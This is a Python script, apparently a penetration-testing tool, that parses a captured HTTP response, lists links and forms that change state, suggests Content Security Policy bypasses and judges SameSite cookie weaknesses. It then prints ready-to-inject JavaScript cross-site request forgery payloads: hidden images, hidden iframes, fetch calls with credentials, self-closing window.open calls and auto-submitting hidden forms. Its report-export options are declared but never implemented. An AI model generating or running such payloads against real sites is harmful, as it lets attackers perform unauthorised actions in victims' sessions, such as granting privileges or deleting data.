#!/usr/bin/env python3
"""
XSS-to-CSRF Payload Generator (..testing..)
Analyzes HTTP responses and generates contextual attack payloads

Usage:
    python3 xss_csrf_gen.py -f response.txt
    python3 xss_csrf_gen.py --interactive
    cat burp_response.txt | python3 xss_csrf_gen.py --stdin
    python3 xss_csrf_gen.py -f response.txt --output-html payloads.html
"""

import re
import json
import sys
import argparse
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass
from typing import List, Dict, Optional

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("Error: BeautifulSoup4 is required. Install with: pip install beautifulsoup4")
    sys.exit(1)

@dataclass
class CSRFTarget:
    method: str
    url: str
    parameters: Dict[str, str]
    requires_auth: bool = True
    target_type: str = "unknown"

@dataclass
class CSPPolicy:
    directives: Dict[str, List[str]]
    bypass_suggestions: List[str]
    payload_restrictions: List[str]

class CSPAnalyzer:
    def __init__(self, csp_header: str):
        self.raw_csp = csp_header
        self.policy = self._parse_csp(csp_header)
    
    def _parse_csp(self, csp_header: str) -> CSPPolicy:
        directives = {}
        
        if not csp_header:
            return CSPPolicy(directives={}, bypass_suggestions=[], payload_restrictions=[])
        
        for directive in csp_header.split(';'):
            directive = directive.strip()
            if not directive:
                continue
                
            parts = directive.split()
            if parts:
                directive_name = parts[0]
                sources = parts[1:] if len(parts) > 1 else []
                directives[directive_name] = sources
        
        bypass_suggestions = self._generate_bypass_suggestions(directives)
        payload_restrictions = self._analyze_payload_restrictions(directives)
        
        return CSPPolicy(
            directives=directives,
            bypass_suggestions=bypass_suggestions,
            payload_restrictions=payload_restrictions
        )
    
    def _generate_bypass_suggestions(self, directives: Dict[str, List[str]]) -> List[str]:
        suggestions = []
        script_src = directives.get('script-src', [])
        
        if "'unsafe-inline'" in script_src:
            suggestions.append("CSP allows 'unsafe-inline' - direct script injection possible")
        
        if "'unsafe-eval'" in script_src:
            suggestions.append("CSP allows 'unsafe-eval' - eval() and Function() bypasses possible")
        
        for source in script_src:
            if source.startswith('http') and ('googleapis.com' in source or 'jsonp' in source.lower()):
                suggestions.append(f"Potential JSONP bypass via: {source}")
        
        if any(source.startswith("'nonce-") for source in script_src):
            suggestions.append("CSP uses nonces - look for nonce extraction or reuse")
        
        if any(source.startswith("'sha") for source in script_src):
            suggestions.append("CSP uses hashes - script content must match exact hash")
        
        if "*" in script_src:
            suggestions.append("CSP allows wildcard (*) - any external script source permitted")
        
        return suggestions
    
    def _analyze_payload_restrictions(self, directives: Dict[str, List[str]]) -> List[str]:
        restrictions = []
        script_src = directives.get('script-src', directives.get('default-src', []))
        
        if "'none'" in script_src:
            restrictions.append("All scripts blocked")
        elif "'self'" in script_src and "'unsafe-inline'" not in script_src:
            restrictions.append("Only same-origin scripts allowed, no inline scripts")
        elif "'unsafe-inline'" not in script_src:
            restrictions.append("Inline scripts blocked - need external source or nonce/hash")
        
        return restrictions

class SameSiteAnalyzer:
    def __init__(self, headers: Dict[str, str]):
        self.headers = headers
        self.analysis = self._analyze_samesite()
    
    def _analyze_samesite(self) -> Dict[str, str]:
        analysis = {
            'session_cookies': [],
            'samesite_policies': [],
            'csrf_risk_level': 'unknown',
            'payload_recommendations': []
        }
        
        set_cookie_headers = []
        for key, value in self.headers.items():
            if key.lower() == 'set-cookie':
                set_cookie_headers.append(value)
        
        if not set_cookie_headers:
            analysis['csrf_risk_level'] = 'high'
            analysis['payload_recommendations'].append('No SameSite restrictions detected - all CSRF vectors should work')
            return analysis
        
        for cookie_header in set_cookie_headers:
            cookie_analysis = self._parse_cookie(cookie_header)
            if cookie_analysis:
                analysis['session_cookies'].append(cookie_analysis)
        
        samesite_policies = [c.get('samesite', 'none').lower() for c in analysis['session_cookies']]
        
        if all(policy == 'strict' for policy in samesite_policies):
            analysis['csrf_risk_level'] = 'low'
            analysis['payload_recommendations'].append('SameSite=Strict detected - only same-origin requests will include cookies')
            analysis['payload_recommendations'].append('XSS-based CSRF still possible (same-origin execution)')
        elif any(policy == 'none' for policy in samesite_policies):
            analysis['csrf_risk_level'] = 'high'
            analysis['payload_recommendations'].append('SameSite=None detected - all CSRF vectors should work')
        elif all(policy == 'lax' for policy in samesite_policies):
            analysis['csrf_risk_level'] = 'medium'
            analysis['payload_recommendations'].append('SameSite=Lax detected - top-level navigation CSRF possible')
            analysis['payload_recommendations'].append('Background requests (img, fetch) may be blocked')
        else:
            analysis['csrf_risk_level'] = 'medium'
            analysis['payload_recommendations'].append('Mixed SameSite policies detected - test each vector')
        
        return analysis
    
    def _parse_cookie(self, cookie_header: str) -> Optional[Dict[str, str]]:
        try:
            parts = cookie_header.split(';')
            if not parts:
                return None
            
            name_value = parts[0].strip()
            if '=' not in name_value:
                return None
            
            name, value = name_value.split('=', 1)
            
            cookie_info = {
                'name': name.strip(),
                'value': value.strip(),
                'httponly': False,
                'secure': False,
                'samesite': 'none'
            }
            
            for part in parts[1:]:
                part = part.strip().lower()
                if part == 'httponly':
                    cookie_info['httponly'] = True
                elif part == 'secure':
                    cookie_info['secure'] = True
                elif part.startswith('samesite='):
                    cookie_info['samesite'] = part.split('=', 1)[1]
            
            return cookie_info
        except Exception:
            return None

class ResponseAnalyzer:
    def __init__(self, raw_response: str):
        try:
            self.raw_response = raw_response.strip()
            if not self.raw_response:
                raise ValueError("Empty response provided")
            
            self.headers, self.body = self._parse_response()
            
            if not self.body:
                raise ValueError("No response body found")
                
            self.soup = BeautifulSoup(self.body, 'html.parser')
            
            csp_header = self.headers.get('content-security-policy', '')
            self.csp_analyzer = CSPAnalyzer(csp_header)
            self.samesite_analyzer = SameSiteAnalyzer(self.headers)
            
        except Exception as e:
            raise ValueError(f"Failed to parse HTTP response: {str(e)}")
        
    def _parse_response(self):
        try:
            normalized_response = self.raw_response.replace('\r\n', '\n').replace('\r', '\n')
            
            separator_idx = normalized_response.find('\n\n')
            if separator_idx == -1:
                raise ValueError("Invalid HTTP response format - no header/body separator found")
            
            headers_text = normalized_response[:separator_idx]
            body = normalized_response[separator_idx + 2:]
            
            lines = headers_text.split('\n')
            if not lines or not lines[0].startswith('HTTP/'):
                raise ValueError("Invalid HTTP response - missing status line")
            
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip().lower()] = value.strip()
                    
            return headers, body
            
        except Exception as e:
            raise ValueError(f"Failed to parse HTTP headers: {str(e)}")
    
    def find_csrf_targets(self) -> List[CSRFTarget]:
        targets = []
        
        try:
            targets.extend(self._find_get_targets())
            targets.extend(self._find_form_targets())
        except Exception as e:
            print(f"Warning: Error during target analysis: {str(e)}")
            
        return targets
    
    def _find_get_targets(self) -> List[CSRFTarget]:
        targets = []
        
        suspicious_params = [
            'promote', 'delete', 'admin', 'privilege', 'role', 
            'activate', 'disable', 'grant', 'revoke', 'edit',
            'remove', 'add', 'create', 'update', 'modify', 'action'
        ]
        
        try:
            links = self.soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    try:
                        parsed = urlparse(href)
                        params = parse_qs(parsed.query)
                        
                        for suspicious in suspicious_params:
                            if any(suspicious in key.lower() or 
                                  suspicious in str(val).lower() 
                                  for key, val in params.items()):
                                flat_params = {k: v[0] if isinstance(v, list) and v else v 
                                             for k, v in params.items()}
                                targets.append(CSRFTarget(
                                    method="GET",
                                    url=href,
                                    parameters=flat_params,
                                    target_type="link"
                                ))
                                break
                    except Exception as e:
                        print(f"Warning: Failed to parse link {href}: {str(e)}")
                        continue
        except Exception as e:
            print(f"Warning: Failed to analyze GET targets: {str(e)}")
        
        return targets
    
    def _find_form_targets(self) -> List[CSRFTarget]:
        targets = []
        
        try:
            forms = self.soup.find_all('form')
            for form in forms:
                try:
                    method = form.get('method', 'GET').upper()
                    action = form.get('action', '')
                    
                    params = {}
                    inputs = form.find_all(['input', 'select', 'textarea'])
                    for inp in inputs:
                        name = inp.get('name')
                        value = inp.get('value', '')
                        inp_type = inp.get('type', 'text')
                        
                        if name:
                            if inp_type == 'checkbox':
                                value = inp.get('value', '1') if inp.get('checked') else ''
                            elif inp_type == 'radio':
                                if inp.get('checked'):
                                    value = inp.get('value', '')
                            elif inp.name == 'select':
                                selected = inp.find('option', selected=True)
                                value = selected.get('value', '') if selected else ''
                            
                            params[name] = value
                    
                    targets.append(CSRFTarget(
                        method=method,
                        url=action,
                        parameters=params,
                        target_type="form"
                    ))
                except Exception as e:
                    print(f"Warning: Failed to parse form: {str(e)}")
                    continue
        except Exception as e:
            print(f"Warning: Failed to analyze forms: {str(e)}")
        
        return targets

class PayloadGenerator:
    def __init__(self, targets: List[CSRFTarget], csp_analyzer: CSPAnalyzer, samesite_analyzer: SameSiteAnalyzer):
        self.targets = targets
        self.csp_analyzer = csp_analyzer
        self.samesite_analyzer = samesite_analyzer
    
    def generate_xss_payloads(self) -> Dict[str, List[Dict[str, str]]]:
        payloads = {}
        
        for target in self.targets:
            try:
                target_key = f"{target.method} {target.url}"
                if target.method == "GET":
                    payloads[target_key] = self._generate_get_payloads(target)
                elif target.method == "POST":
                    payloads[target_key] = self._generate_post_payloads(target)
            except Exception as e:
                print(f"Warning: Failed to generate payload for {target.url}: {str(e)}")
                continue
        
        return payloads
    
    def _generate_get_payloads(self, target: CSRFTarget) -> List[Dict[str, str]]:
        payloads = []
        
        try:
            payloads.append({
                'type': 'image',
                'description': 'Image-based CSRF (silent, bypasses CORS)',
                'samesite_compatibility': 'Works with SameSite=None only',
                'csp_compatibility': self._check_csp_compatibility('image'),
                'payload': f"""// Image-based CSRF (silent)
let img = new Image();
img.src = '{target.url}';"""
            })
            
            payloads.append({
                'type': 'iframe',
                'description': 'Hidden iframe CSRF (silent navigation)',
                'samesite_compatibility': 'Works with SameSite=None or Lax (top-level navigation)',
                'csp_compatibility': self._check_csp_compatibility('iframe'),
                'payload': f"""// Hidden iframe CSRF
let iframe = document.createElement('iframe');
iframe.src = '{target.url}';
iframe.style.display = 'none';
document.body.appendChild(iframe);"""
            })
            
            payloads.append({
                'type': 'fetch',
                'description': 'Fetch API CSRF (with credentials)',
                'samesite_compatibility': 'Works with SameSite=None only',
                'csp_compatibility': self._check_csp_compatibility('fetch'),
                'payload': f"""// Fetch-based CSRF (with credentials)
fetch('{target.url}', {{
    method: 'GET',
    credentials: 'include'
}}).catch(e => console.log('CSRF executed'));"""
            })
            
            payloads.append({
                'type': 'window_open',
                'description': 'Window.open CSRF (top-level navigation)',
                'samesite_compatibility': 'Works with SameSite=Lax and None',
                'csp_compatibility': 'Usually not blocked by CSP',
                'payload': f"""// Window.open CSRF (bypasses SameSite=Lax)
let w = window.open('{target.url}', '_blank');
setTimeout(() => w.close(), 1000);"""
            })
            
        except Exception as e:
            print(f"Warning: Error generating GET payloads: {str(e)}")
            
        return payloads
    
    def _generate_post_payloads(self, target: CSRFTarget) -> List[Dict[str, str]]:
        payloads = []
        
        try:
            form_inputs = ""
            for param, value in target.parameters.items():
                escaped_value = str(value).replace("'", "\\'")
                form_inputs += f"""
    let input_{param} = document.createElement('input');
    input_{param}.type = 'hidden';
    input_{param}.name = '{param}';
    input_{param}.value = '{escaped_value}';
    form.appendChild(input_{param});"""
            
            payloads.append({
                'type': 'form_submit',
                'description': 'Auto-submitting form CSRF',
                'samesite_compatibility': 'Works with SameSite=None only (background form submission)',
                'csp_compatibility': self._check_csp_compatibility('form'),
                'payload': f"""// Auto-submitting form CSRF
let form = document.createElement('form');
form.method = 'POST';
form.action = '{target.url}';{form_inputs}

document.body.appendChild(form);
form.submit();"""
            })
            
            post_data = json.dumps(target.parameters)
            payloads.append({
                'type': 'fetch_post',
                'description': 'Fetch API POST CSRF',
                'samesite_compatibility': 'Works with SameSite=None only',
                'csp_compatibility': self._check_csp_compatibility('fetch'),
                'payload': f"""// Fetch POST CSRF
fetch('{target.url}', {{
    method: 'POST',
    credentials: 'include',
    headers: {{
        'Content-Type': 'application/x-www-form-urlencoded'
    }},
    body: '{urlencode(target.parameters)}'
}}).catch(e => console.log('CSRF executed'));"""
            })
            
        except Exception as e:
            print(f"Warning: Error generating POST payloads: {str(e)}")
            
        return payloads
    
    def _check_csp_compatibility(self, payload_type: str) -> str:
        if not self.csp_analyzer.policy.directives:
            return "No CSP detected - payload should work"
        
        restrictions = self.csp_analyzer.policy.payload_restrictions
        
        if payload_type in ['image', 'iframe', 'window_open']:
            if any('scripts blocked' in r for r in restrictions):
                return "CSP may allow this (non-script payload)"
            else:
                return "Should work unless CSP blocks navigation"
        
        elif payload_type in ['fetch', 'form']:
            if "'unsafe-inline'" in str(self.csp_analyzer.policy.directives.get('script-src', [])):
                return "CSP allows inline scripts - payload should work"
            else:
                return "CSP blocks inline scripts - payload may be blocked"
        
        return "Check CSP policy manually"

def analyze_response(raw_response: str, output_html=None, output_curl=None, output_burp=None):
    """Main analysis function"""
    try:
        analyzer = ResponseAnalyzer(raw_response)
        targets = analyzer.find_csrf_targets()
        
        print(f"Found {len(targets)} potential CSRF targets:")
        if not targets:
            print("No CSRF targets detected in the response.")
            return
            
        for i, target in enumerate(targets, 1):
            print(f"  {i}. {target.method} {target.url} ({target.target_type})")
            if target.parameters:
                print(f"     Parameters: {target.parameters}")
        
        # Security Analysis
        print("\nSecurity Analysis:")
        print("-" * 50)
        
        # CSP Analysis
        if analyzer.csp_analyzer.policy.directives:
            print(f"CSP Detected: {analyzer.csp_analyzer.raw_csp}")
            if analyzer.csp_analyzer.policy.bypass_suggestions:
                print("CSP Bypass Suggestions:")
                for suggestion in analyzer.csp_analyzer.policy.bypass_suggestions:
                    print(f"  - {suggestion}")
        else:
            print("CSP: Not detected")
        
        # SameSite Analysis
        print(f"\nSameSite Analysis:")
        print(f"CSRF Risk Level: {analyzer.samesite_analyzer.analysis['csrf_risk_level']}")
        if analyzer.samesite_analyzer.analysis['payload_recommendations']:
            print("Recommendations:")
            for rec in analyzer.samesite_analyzer.analysis['payload_recommendations']:
                print(f"  - {rec}")
        
        # Generate payloads
        generator = PayloadGenerator(targets, analyzer.csp_analyzer, analyzer.samesite_analyzer)
        payloads = generator.generate_xss_payloads()
        
        if payloads:
            print(f"\nGenerated XSS->CSRF payloads:")
            for url, payload_list in payloads.items():
                print(f"\nTarget: {url}")
                print("-" * 50)
                for j, payload_data in enumerate(payload_list, 1):
                    print(f"Payload {j}: {payload_data['description']}")
                    print(f"Code:")
                    print(payload_data['payload'])
                    print()
        
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="XSS-to-CSRF Payload Generator")
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', '--file', help='HTTP response file to analyze')
    group.add_argument('--interactive', action='store_true', help='Interactive mode')
    group.add_argument('--stdin', action='store_true', help='Read from stdin')
    
    parser.add_argument('--output-html', help='Generate HTML report file')
    parser.add_argument('--output-curl', help='Generate curl commands file')
    parser.add_argument('--output-burp', help='Generate Burp requests file')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    if args.file:
        with open(args.file, 'r', encoding='utf-8') as f:
            response = f.read()
    elif args.interactive:
        print("Paste your HTTP response (Ctrl+D when finished):")
        response = sys.stdin.read()
    elif args.stdin:
        response = sys.stdin.read()
    
    analyze_response(response, args.output_html, args.output_curl, args.output_burp)

if __name__ == "__main__":
    main()
    
